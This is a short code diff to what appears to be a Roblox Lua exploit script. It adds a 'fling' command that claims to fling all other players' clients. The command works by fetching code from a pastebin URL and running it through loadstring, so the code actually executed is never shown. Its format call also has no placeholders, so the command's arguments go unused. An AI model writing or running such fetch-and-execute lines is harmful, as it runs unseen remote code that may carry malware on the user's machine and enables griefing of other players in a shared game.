@@ -160,7 +160,16 @@ local p = game:GetService("Players").LocalPlayer
     ]]):format(p.X, p.Y, p.Z)
   end
 })
-
+table.insert(cmds, {
+  Name = "fling",
+  Description = "Makes all clients fling (op)",
+  Aliases = { "f" },
+  Function = function(args)
+    return ([[
+loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
+    ]]):format(table.concat(args, " "))
+  end
+})
 
 table.insert(commands, system); end
 
